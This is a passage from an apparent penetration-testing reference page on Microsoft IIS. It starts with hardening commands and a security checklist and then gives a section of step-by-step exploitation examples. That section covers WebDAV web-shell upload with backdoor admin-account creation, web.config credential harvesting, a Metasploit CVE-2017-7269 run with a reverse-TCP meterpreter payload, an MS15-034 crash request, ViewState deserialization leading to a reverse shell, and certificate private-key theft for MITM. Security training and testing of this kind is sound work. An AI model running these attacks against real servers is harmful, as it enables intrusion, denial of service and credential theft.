    icacls "D:\Logs" /grant "SYSTEM:(OI)(CI)F"
    icacls "D:\Logs" /grant "Administrators:(OI)(CI)F"
    ```
    
    **12. Enable and configure logging:**
    ```powershell
    # Enable logging (W3C format recommended)
    %systemroot%\system32\inetsrv\appcmd.exe set site "Default Web Site" /logFile.enabled:true
    %systemroot%\system32\inetsrv\appcmd.exe set site "Default Web Site" /logFile.logFormat:W3C
    
    # Log all fields for security analysis
    %systemroot%\system32\inetsrv\appcmd.exe set config -section:sites -siteDefaults.logFile.logExtFileFlags:"Date,Time,ClientIP,UserName,SiteName,ComputerName,ServerIP,Method,UriStem,UriQuery,HttpStatus,Win32Status,BytesSent,BytesRecv,TimeTaken,ServerPort,UserAgent,Cookie,Referer,ProtocolVersion,Host,HttpSubStatus"
    ```
    
    **13. Implement IP and domain restrictions:**
    ```powershell
    # Allow only specific IPs for admin areas
    %systemroot%\system32\inetsrv\appcmd.exe set config "Default Web Site/admin" /section:ipSecurity /allowUnlisted:false
    %systemroot%\system32\inetsrv\appcmd.exe set config "Default Web Site/admin" /section:ipSecurity /+[ipAddress='192.168.1.100',allowed='true']
    ```
    
    **14. Configure dynamic IP restrictions:**
    ```xml
    <system.webServer>
      <security>
        <dynamicIpSecurity>
          <!-- Block IP if 10 requests in 5 seconds -->
          <denyByConcurrentRequests enabled="true" maxConcurrentRequests="10" />
          <!-- Block IP if 20 requests in 10 seconds -->
          <denyByRequestRate enabled="true" maxRequests="20" requestIntervalInMilliseconds="10000" />
        </dynamicIpSecurity>
      </security>
    </system.webServer>
    ```
    
    **15. Use URL Rewrite for additional security:**
    ```xml
    <!-- Enforce HTTPS -->
    <rewrite>
      <rules>
        <rule name="HTTPS Redirect" stopProcessing="true">
          <match url="(.*)" />
          <conditions>
            <add input="{HTTPS}" pattern="off" />
          </conditions>
          <action type="Redirect" url="https://{HTTP_HOST}/{R:1}" redirectType="Permanent" />
        </rule>
      </rules>
    </rewrite>
    ```
    
    - Keep Windows Server and IIS regularly updated with latest security patches
    - Follow CIS Benchmark for IIS hardening guidelines
    - Implement Web Application Firewall (WAF) for additional protection
    - Use fail2ban or similar tools to block brute-force attacks
    - Enable Windows Firewall and limit inbound connections
    - Regularly audit IIS configuration and permissions
    - Monitor Event Logs for security events
    - Backup configuration files regularly
    - Use HTTPS everywhere with valid certificates
    - Implement proper input validation in applications
    - Use parameterized queries to prevent SQL injection
    - Regularly scan for vulnerabilities
    - Disable unused IIS features and role services
    - Use dedicated service accounts with least privileges
    - Implement network segmentation for DMZ servers

---

## Exploitation Examples

??? example "Example 1: IIS Tilde Enumeration to Discover Hidden Admin Panel"
    ```bash
    # Step 1: Scan for short names
    shortscan http://target.com/
    
    # Output reveals:
    # ADMINI~1 found
    # CONFIG~1 found
    
    # Step 2: Brute-force full names
    # ADMINI~1 -> admin/ or administrator/
    curl http://target.com/admin/
    curl http://target.com/administrator/
    
    # Step 3: Discovered hidden admin panel
    # http://target.com/administrator/login.aspx
    # Proceed with credential attacks or vulnerability scanning
    ```

??? example "Example 2: Exploiting WebDAV for File Upload and Shell Access"
    ```bash
    # Step 1: Check if WebDAV is enabled
    curl -X OPTIONS http://target.com
    # Response: DAV: 1,2
    
    # Step 2: Test authentication
    curl -X PUT http://target.com/shell.txt -d "test" --user admin:password
    
    # Step 3: Upload ASPX shell
    curl -X PUT http://target.com/shell.aspx --data-binary @webshell.aspx --user admin:password
    
    # Step 4: Access shell
    curl "http://target.com/shell.aspx?cmd=whoami"
    # Output: nt authority\iis apppool\defaultapppool
    
    # Step 5: Escalate privileges or pivot
    curl "http://target.com/shell.aspx?cmd=net user hacker Pass123! /add"
    curl "http://target.com/shell.aspx?cmd=net localgroup administrators hacker /add"
    ```

??? example "Example 3: Extracting Database Credentials from web.config"
    ```bash
    # Step 1: Attempt to access web.config directly (usually blocked)
    curl http://target.com/web.config
    # Response: 404 or 403 (IIS blocks by default)
    
    # Step 2: Try backup files
    curl http://target.com/web.config.bak
    curl http://target.com/web.config~
    curl http://target.com/Web.Config.old
    
    # Step 3: If accessible, extract credentials
    # Look for:
    # <connectionStrings>
    #   <add name="DefaultConnection" 
    #        connectionString="Server=sql.internal;Database=webapp;User Id=sa;Password=P@ssw0rd123;" />
    # </connectionStrings>
    
    # Step 4: Use credentials to access database
    mssqlclient.py sa:P@ssw0rd123@sql.internal
    
    # Step 5: Extract sensitive data or escalate
    ```

??? example "Example 4: IIS 6.0 WebDAV Buffer Overflow (CVE-2017-7269)"
    ```bash
    # Using Metasploit
    msfconsole
    use exploit/windows/iis/iis_webdav_scstoragepathfromurl
    set RHOST 192.168.1.100
    set RPORT 80
    set TARGETURI /
    set payload windows/meterpreter/reverse_tcp
    set LHOST 192.168.1.50
    set LPORT 4444
    exploit
    
    # Expected result: Meterpreter shell with SYSTEM privileges
    # This vulnerability is critical and widely exploited
    # Only affects IIS 6.0 on Windows Server 2003 R2
    ```

??? example "Example 5: HTTP.sys Range Header DoS/RCE (MS15-034)"
    ```bash
    # Test for vulnerability
    curl -I -H "Range: bytes=0-18446744073709551615" http://target.com/
    
    # Vulnerable response:
    # HTTP/1.1 416 Requested Range Not Satisfiable
    
    # Not vulnerable response:
    # HTTP/1.1 200 OK (or other non-416 response)
    
    # For DoS (Blue Screen of Death)
    curl -H "Range: bytes=18-18446744073709551615" http://target.com/welcome.png
    
    # Causes system crash on vulnerable systems
    # Can be used for RCE with more sophisticated exploitation
    ```

??? example "Example 6: ASP.NET ViewState Deserialization Attack"
    ```bash
    # Prerequisites:
    # - ViewState MAC validation disabled: enableViewStateMac="false"
    # - Or: known machineKey
    
    # Step 1: Generate malicious ViewState with ysoserial.net
    ysoserial.exe -o base64 -g TypeConfuseDelegate \
                  -f ObjectStateFormatter \
                  -c "cmd.exe /c whoami > C:\inetpub\wwwroot\output.txt"
    
    # Step 2: Inject into __VIEWSTATE parameter
    curl -X POST http://target.com/page.aspx \
         -d "__VIEWSTATE=[malicious_base64_payload]&__VIEWSTATEGENERATOR=CA0B0334"
    
    # Step 3: Verify code execution
    curl http://target.com/output.txt
    # Output: domain\apppool_identity
    
    # Step 4: Deploy persistent backdoor
    ysoserial.exe -c "powershell -enc [base64_reverse_shell]"
    ```

??? example "Example 7: Stealing SSL Certificate Private Keys"
    ```powershell
    # If you have remote code execution on IIS server
    
    # Step 1: List installed certificates
    Get-ChildItem -Path Cert:\LocalMachine\My
    
    # Step 2: Export certificate with private key (requires admin)
    # Using PowerShell
    $cert = Get-ChildItem -Path Cert:\LocalMachine\My\[Thumbprint]
    $password = ConvertTo-SecureString -String "ExportPassword123" -Force -AsPlainText
    Export-PfxCertificate -Cert $cert -FilePath C:\Windows\Temp\cert.pfx -Password $password
    
    # Step 3: Download the certificate
    # Use your web shell or transfer method
    
    # Step 4: Crack the password (if needed) using pfx2john
    pfx2john cert.pfx > cert.hash
    john cert.hash --wordlist=rockyou.txt
    
    # Step 5: Import and use certificate for MITM attacks
    ```

---

## Metadata

- **Template version:** 1.0
- **Last updated:** January 2026
- **Contributor:** Laurince AGANI / Epihack Bénin
- **Sources verified:** Yes